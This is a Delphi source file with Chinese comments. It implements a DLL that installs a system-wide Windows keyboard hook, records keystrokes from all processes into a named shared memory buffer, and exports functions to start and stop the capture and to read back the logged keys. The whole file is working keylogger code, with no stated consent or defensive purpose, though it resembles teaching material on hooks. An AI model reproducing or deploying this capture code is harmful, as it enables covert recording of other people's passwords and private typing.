unit UnitDll;

interface

uses Windows;

const BUFFER_SIZE = 16 * 1024; // 文件映射到内存的大小
const HOOK_MEM_FILENAME = 'MEM_FILE'; // 映像文件名
const HOOK_MUTEX_NAME = 'MUTEX_NAME'; // 互斥名

type
  // 共享结构
  TShared = record
    Keys: array[0..BUFFER_SIZE] of Char;
    KeyCount: Integer;
  end;
  // 共享结构指针
  PShared = ^TShared;

var
  MemFile, HookMutex: THandle;  // 文件句柄和互斥句柄
  hOldKeyHook: HHook; // 钩子变量
  Shared: PShared; // 共享变量

implementation



// 重要：键盘钩子回调
function KeyHookProc(iCode: Integer; wParam: WPARAM;
  lParam: LPARAM): LRESULT; stdcall; export;
const
  KeyPressMask = $80000000;
begin
  if iCode < 0 then
    Result := CallNextHookEx(hOldKeyHook, iCode, wParam, lParam)
  else
  begin
    if ((lParam and KeyPressMask) = 0) then
    begin
      // 键盘消息捕获
      Shared^.Keys[Shared^.KeyCount] := Char(wParam and $00FF);
      Inc(Shared^.KeyCount);
      // 超出内存限定大小则重置
      if Shared^.KeyCount >= BUFFER_SIZE - 1 then
        Shared^.KeyCount := 0;
    end;
    result:=0;
  end;
end;

// 安装钩子
function EnableKeyHook: BOOL; export;
begin
  Shared^.KeyCount := 0;
  if hOldKeyHook = 0 then
  begin
    // 设置钩子过滤
    {WH_KEYBOARD: 安装的是键盘钩子 KeyHookProc: 消息回调, HInstance: 回调函数实例 线程ID}
    hOldKeyHook := SetWindowsHookEx(WH_KEYBOARD, KeyHookProc, HInstance, 0);
  end;
  Result := (hOldKeyHook <> 0);
end;

{撤消钩子过滤函数}
function DisableKeyHook: BOOL; export;
begin
  if hOldKeyHook <> 0 then
  begin
    UnHookWindowsHookEx(hOldKeyHook);
    hOldKeyHook := 0;
    Shared^.KeyCount := 0;
  end;
  Result := (hOldKeyHook = 0);
end;


// 得到获得多少按键
function GetKeyCount: Integer; export;
begin
  Result := Shared^.KeyCount;
end;

// 得到第I个按键
function GetKey(index: Integer): Char; export;
begin
  Result := Shared^.Keys[index];
end;

// 清空按键
procedure ClearKeyString; export;
begin
  Shared^.KeyCount := 0;
end;

// 导出函数列表
exports
  EnableKeyHook,
  DisableKeyHook,
  GetKeyCount,
  ClearKeyString,
  GetKey;

initialization
  // 创建互斥变量，DLL只能有一个进程可以使用
  HookMutex := CreateMutex(nil, True, HOOK_MUTEX_NAME);
  // 打开文件映像
  MemFile := OpenFileMapping(FILE_MAP_WRITE, False, HOOK_MEM_FILENAME);
  // 如果不存在该文件映像则创建
  if MemFile = 0 then
    MemFile := CreateFileMapping($FFFFFFFF, nil, PAGE_READWRITE, 0, SizeOf(TShared), HOOK_MEM_FILENAME);
  // 文件映射内存
  Shared := MapViewOfFile(MemFile, File_MAP_WRITE, 0, 0, 0);
  // 释放互斥变量
  ReleaseMutex(HookMutex);
  // 关闭互斥句柄
  CloseHandle(HookMutex);

finalization
  // 撤消钩子过滤
  if hOldKeyHook <> 0 then
    DisableKeyHook;
  // 释放映射
  UnMapViewOfFile(Shared);
  // 关闭映像文件
  CloseHandle(MemFile);
end.

